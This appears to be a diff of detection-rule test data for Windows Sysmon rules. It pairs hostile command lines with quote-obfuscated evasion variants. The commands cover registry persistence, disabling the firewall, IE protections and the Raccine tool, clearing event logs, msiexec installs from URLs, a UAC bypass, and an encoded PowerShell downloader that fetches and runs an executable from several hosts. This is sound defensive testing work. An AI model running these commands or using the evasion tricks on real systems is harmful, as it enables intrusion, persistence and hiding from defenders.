+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"reg add HKLM\software\Microsoft\Windows NT\Cur""rentVersion\Wi""nlogon\Shell"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_04.json,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunServices
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"reg a""d""d HKLM\software\Microsoft\Windows NT\Curren""tVersion\Win""dows"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_06.json,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"reg add HKLM\softw""are\Micros""oft\Windows\CurrentVersion\Ru""nServicesOn""ce"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_07.json,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_02.json,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunOnce
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"reg ad""""d HKLM\software\Microsoft\Windows\Current""Vers""ion\Explorer\User Shell Folders"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_08.json,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Windows
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_05.json,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_10.json,reg add HKLM\system\CurrentControlSet\Control\SafeBoot\AlternateShell
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell /c New-ItemProperty -Path HKLM\Software\Policies\Microsoft\Internet Explorer\Main!DEPOff  -n""am""e D""E""POff -va""l""ue ""1"" "
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Internet Explorer\Main\DisableFirstRunCustomize  -name   DisableFirstRunCustomize    -value    2 
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Match_01.json,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEharden -name IEHarden -value 0 
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Match_03.json,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Internet Explorer\Main\DisableFirstRunCustomize  -name DisableFirstRunCustomize -value 2 
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEharden -n""am""e I""EH""arden -v""al""ue ""0"" "
+win_susp_disable_ie_features,Microsoft-Windows-Sysmon_1_Match_02.json,powershell /c New-ItemProperty -Path HKLM\Software\Policies\Microsoft\Internet Explorer\Main!DEPOff  -name DEPOff -value 1 
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"r""""e""g"" de""le""te HKLM\Path\Rac""c""ine Tray"
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"sch""""t""ask""s -de""""le""te"" -tn Raccine Rules Updater"
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Match_01.json,taskkill /IM RaccineSettings.exe
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Match_03.json,schtasks /delete -tn Raccine Rules Updater
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"t""""a""skk""ill.exe -""IM""     R""acci""neSet""""tings.exe"
+win_susp_disable_raccine,Microsoft-Windows-Sysmon_1_Match_02.json,reg.exe delete HKLM\Path\Raccine Tray
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"wevtutil.exe ""cl"" System"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"wevtutil.exe se""t-l""og Application /ms:1048575"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"powershell /C L""imi""t-Ev""ent""Log System -MaximumSize 64KB"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"powershell /C Cl""ear""-EventLog System"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_01.json,wevtutil.exe clear-log System
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_03.json,wevtutil.exe set-log Application /ms:1048575
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"wevtutil.exe cl""ear-l""og System"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"wmic nteventlog where filename=""application"" ""cleareventlog"""
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_04.json,powershell /C Clear-EventLog System
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_06.json,powershell /C Limit-EventLog System -MaximumSize 64KB
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"powershell /C ""Re""mo""ve-Ev""ent""""Log System"
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_07.json,"wmic nteventlog where filename=""application"" cleareventlog "
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_02.json,wevtutil.exe cl System
+win_susp_eventlog_clear,Microsoft-Windows-Sysmon_1_Match_05.json,powershell /C Remove-EventLog System
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\expl""ore""r.""exe"" /r""oo""t, ""C:\Windows\System32\notepad.exe"""
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"ex""""plorer -""roo""t, ""C:\Windows\System32\cmd.exe"""
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Match_01.json,"explorer.exe /root, ""C:\Windows\System32\cmd.exe"""
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Match_03.json,"explorer.exe /root, ""C:\Windows\System32\cmd.exe"""
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"explorer root, ""C:\Windows\System32\cmd.exe"""
+win_susp_explorer_break_proctree,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Windows\explorer.exe /root, ""C:\Windows\System32\notepad.exe"""
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"findstr.exe maliciousfilecontent *"".""lnk"
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\findstr.exe findme ""*.""lnk"
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Match_01.json,findstr searchstring *.lnk
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\findstr.exe findme *.lnk
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"findstr searchstring *.""lnk"""
+win_susp_findstr_lnk,Microsoft-Windows-Sysmon_1_Match_02.json,findstr.exe maliciousfilecontent *.lnk
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"n""ets""h.exe      ad""vfir""ewall    s""et""   currentprofile  ""st""ate ""off"" "
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"ne""ts""h.exe   ""advfirewall""   s""et""  allprofiles  st""ate"" o""""ff "
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Match_01.json,netsh firewall set opmode mode=disable
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Match_03.json,netsh advfirewall set allprofiles state off
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"n""et""sh.exe   fi""re""wall   s""""et    ""opm""ode   ""mode""=dis""ab""le"
+win_susp_firewall_disable,Microsoft-Windows-Sysmon_1_Match_02.json,netsh advfirewall set currentprofile state off
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"fsutil.exe usn cre""ate""jour""""nal C:"
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"fsutil usn ""cre""atejourn""al"" C:"
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Match_01.json,fsutil usn deletejournal /D C:
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Match_03.json,fsutil usn createjournal C:
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"fsutil usn del""ete""jo""""urnal /D C:"
+win_susp_fsutil_usage,Microsoft-Windows-Sysmon_1_Match_02.json,fsutil.exe usn createjournal C:
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\inetsrv\""APP""CMD.exe in""sta""ll m""odu""le /""name"":ModuleName /image:C:\Path\To\image.dll /add:true"
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""APPCM""D.exe i""nst""all mo""dul""e -""nam""e:EmanEludom -image:C:\Another\egami.dll -add:true"
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:HTTPParser /image:C:\Windows\System32\inetsrv\HTTPParser.dll /add:true
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:EmanEludom /image:C:\Another\egami.dll /add:true
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,APPCMD.exe install module /name:HTTPParser /image:C:\Windows\System32\inetsrv\HTTPParser.dll /add:true
+win_susp_iss_module_install,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\inetsrv\APPCMD.exe install module /name:ModuleName /image:C:\Path\To\image.dll /add:true
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd /c ""msiexec"" /q /I ""https://my/malicious.msi"""
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd /c msie""x""ec /q /I ""https://source/thisisagood.msi"""
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Match_01.json,"cmd /c msiexec /q /I ""https://mal.msi"""
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Match_03.json,"cmd /c msiexec /q /I ""https://source/thisisagood.msi"""
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd /c ms""ie""xec /q /I ""https://mal.msi"""
+win_susp_msiexec_web_install,Microsoft-Windows-Sysmon_1_Match_02.json,"cmd /c msiexec /q /I ""https://my/malicious.msi"""
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"net """"loca""lg""roup Administrators"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net.exe ""us""er name"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"net a""cc""ounts"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"net.exe v""ie""w /all"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_01.json,net group groupname
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_03.json,net.exe user name
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net g""rou""p grpname"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"net """"u""s""e"
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_04.json,net.exe view /all
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"net.exe s""top"" ""Service"""
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_06.json,net accounts
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,C:\Windows\System32\net.exe share 
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_07.json,net use
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_02.json,net localgroup Administrators
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_08.json,"net.exe stop ""Service"""
+win_susp_net_execution,Microsoft-Windows-Sysmon_1_Match_05.json,C:\Windows\System32\net.exe share
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"netsh.exe ""ad""d he""lp""er mymal.dll"
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\netsh.exe a""d""d h""elp""er C:\Users\username\sus.dll"
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Match_01.json,netsh add helper C:\path\to\malicious.dll
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\netsh.exe add helper C:\Users\username\sus.dll
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"netsh a""dd"" ""help""er C:\path\to\malicious.dll"
+win_susp_netsh_dll_persistence,Microsoft-Windows-Sysmon_1_Match_02.json,netsh.exe add helper mymal.dll
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,C:\Windows\System32\odbcconf.exe /f another.rsp
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,odbcconf.exe /f nicefile.rsp
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Match_01.json,odbcconf -f file.rsp
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Match_03.json,odbcconf.exe -f file.rsp
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,odbcconf /f file.rsp
+win_susp_odbcconf,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\odbcconf.exe -f another.rsp
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,ping.exe 0x7f000001
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,C:\Windows\System32\ping.exe   0x7f000001
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\System32\ping.exe 0x7f000001
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\ping.exe 0x7f000001
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Windows\System32\p""in""g.exe ""0""x7f000001"
+win_susp_ping_hex_ip,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\ping.exe 0x7f000001
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,powershell.exe /noP -sta /w 1 -enc C0D3D
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,powershell.exe -NoP /NonI /W Hidden -Enc ENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"powershell.exe -NoP -sta -NonI -W Hidden -""""enc SQBENC0D3DC0MM4ND"
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -NoP -sta -NonI -W Hidden -Enc ENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -NoP -NonI -W Hidden -Enc ENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,powershell.exe /NoP -sta -NonI -W Hidden /Enc ENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Match_04.json,powershell.exe -NoP -sta -NonI -W Hidden -enc SQBENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,powershell.exe -nop -exec bypass -e SQBENC0D3DC0MM4ND
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe -noP -sta -w 1 -enc C0D3D
+win_susp_powershell_empire_launch,Microsoft-Windows-Sysmon_1_Match_05.json,powershell.exe -nop -exec bypass -EncodedCommand SQBENC0D3DC0MM4ND
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,powershell.exe /NoP /NonI /W Hidden /c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell /NoP /NonI /W Hidden /enc $x
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI /W Hidden -enc $x
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Match_01.json,powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Match_03.json,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,powershell.exe /NoP /NonI /c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell /NoP /NonI /W Hidden /enc $x
+win_susp_powershell_empire_uac_bypass,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -enc ""JABBA""HUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= "
+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -""""e    JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= "
+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -e JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Match_03.json,powershell -e    JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= 
+win_susp_powershell_enc_cmd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -""""e JABBAHUASwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABNAEIAQQA9ACcAaAB0AHQAcAA6AC8ALwBtAGkAZQBrAG8AdwBvAC4AcABsAC8AYgBnADQAOABDAGcAbABaAEAAaAB0AHQAcAA6AC8ALwBlAG4AdAByAGUAcAByAGUAbgBhAGIAbABlADIAdwBwAC4AZQB4AGkAZwBpAG8ALgBjAG8AbQAvAHYAMwBsAFcAWgBBAEwAQABoAHQAdABwADoALwAvAGQAZQBtAG8ALgBkAHMAaQBzAHQAZQBtAGEAcwAuAG4AZQB0AC8AdwBjAGsAVgBqAGMAMgBnAEcAYgBAAGgAdAB0AHAAOgAvAC8AZwBpAGEAbgBjAGEAcgBsAG8ALQBjAGEAcwB0AGkAbABsAG8ALgBjAG8AbQAvAFYAVAByAHIAVgBUAHIAeABqAGQAQABoAHQAdABwADoALwAvAGgAdQBlAGwAbABhAHMAaQBtAHAAcgBlAHMAYQBzAC4AYwBvAG0ALwAyAHMAcQBvAGwANQBrAHkAUABGACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABQAFkAdwAgAD0AIAAnADUAOQAyACcAOwAkAG0ARABjAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAFAAWQB3ACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAEcAegAgAGkAbgAgACQATQBCAEEAKQB7AHQAcgB5AHsAJABBAHUASwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABvAEcAegAsACAAJABtAEQAYwApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABtAEQAYwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA= "
